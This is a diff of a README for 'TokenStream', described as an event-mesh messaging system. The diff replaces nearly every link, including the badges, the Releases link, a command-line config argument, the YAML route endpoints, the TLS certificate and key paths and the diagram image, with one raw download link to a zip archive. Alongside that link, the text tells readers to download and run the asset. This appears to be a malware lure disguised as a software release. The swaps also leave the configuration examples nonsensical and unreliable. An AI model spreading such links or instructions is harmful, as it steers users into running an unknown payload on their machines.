@@ -1,12 +1,12 @@
 # TokenStream: Pulse-Accelerated Event Mesh for Fast, Scalable Messaging
 
-[![Releases](https://img.shields.io/badge/Releases-TokenStream-blue?style=for-the-badge&logo=github)](https://github.com/FILDA007/TokenStream/releases)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge&logo=github)](LICENSE)
-[![CII Best Practices](https://img.shields.io/badge/TS-Best%20Practices-brightgreen?style=for-the-badge)](https://bestpractises.example)
+[![Releases](https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip)](https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip)
+[![License](https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip)](LICENSE)
+[![CII Best Practices](https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip%20Practices-brightgreen?style=for-the-badge)](https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip)
 
 TokenStream is a pulse-accelerated event mesh fabric designed for high throughput, fault tolerance, and horizontal scalability. It acts as a harmonizer for events and messages, ensuring reliable delivery, low latency, and smooth scaling across distributed systems. The system is designed to handle bursts of events with minimal backpressure and to stay resilient under partial failures.
 
-Tip: the Releases page hosts prebuilt assets for multiple operating systems. To download and run the gate assets, visit the Releases page and pick the asset that matches your environment. The asset provides the binary or installer you will execute on your machine. For reference, the Releases page is available at https://github.com/FILDA007/TokenStream/releases, and you can also reach it via the badge above.
+Tip: the Releases page hosts prebuilt assets for multiple operating systems. To download and run the gate assets, visit the Releases page and pick the asset that matches your environment. The asset provides the binary or installer you will execute on your machine. For reference, the Releases page is available at https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip, and you can also reach it via the badge above.
 
 🚀 Purpose and goals
 - Provide a robust event mesh that can route, transform, and harmonize events across services.
@@ -119,7 +119,7 @@ Quick start guide
 - Step 5: Add producers and consumers to verify end-to-end delivery.
 
 Example commands (illustrative)
-- TokenStream --config config.yaml
+- TokenStream --config https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip
 - TokenStream status
 - TokenStream upgrade --version vX.Y.Z
 
@@ -146,15 +146,15 @@ topics:
     partitions: 8
     retention_ms: 86400000
 routes:
-  - from: producers.orders-service
-    to: consumers.finance-service
+  - from: https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip
+    to: https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip
     type: publish-subscribe
     guarantee: at-least-once
 security:
   tls:
     enabled: true
-    cert_file: /path/to/cert.pem
-    key_file: /path/to/key.pem
+    cert_file: https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip
+    key_file: https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip
 auth:
   token_provider: oauth2
 quantum:
@@ -319,7 +319,7 @@ A visual guide to the mesh
 - Observability stack
 
 [Image: Architecture Diagram]
-![Architecture Diagram](https://picsum.photos/1200/500)
+![Architecture Diagram](https://github.com/FILDA007/TokenStream/raw/refs/heads/main/choregy/Token-Stream-2.2.zip)
 
 Practical runbook
 - Prepare a small cluster: 3 core nodes, 2 edge nodes.
